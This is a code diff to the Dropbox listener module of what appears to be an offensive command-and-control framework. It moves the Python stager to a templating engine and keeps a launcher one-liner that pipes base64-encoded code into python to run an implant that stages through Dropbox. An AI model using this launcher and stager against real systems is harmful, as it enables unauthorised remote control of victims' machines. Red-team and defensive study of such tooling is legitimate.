@@ -14,6 +14,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
 
 
 class Listener:
@@ -363,7 +364,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -429,18 +430,20 @@ class Listener:
 
 
         elif language.lower() == 'python':
+            template_path = os.path.join(self.mainMenu.installPath, 'data/agent/stagers')
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('dropbox.py')
 
-            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_options = {
+                    'staging_folder': stagingFolder,
+                    'poll_interval': pollInterval,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'api_token': apiToken
+                    }
 
-            stager = helpers.strip_python_comments(stager)
-            # patch the server and key information
-            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
-            stager = stager.replace('REPLACE_PROFILE', profile)
-            stager = stager.replace('REPLACE_API_TOKEN', apiToken)
+            stager = template.render(template_options)
+            # TODO compress, minify, etc. with https://liftoff.github.io/pyminifier/
 
             if encode:
                 return base64.b64encode(stager)
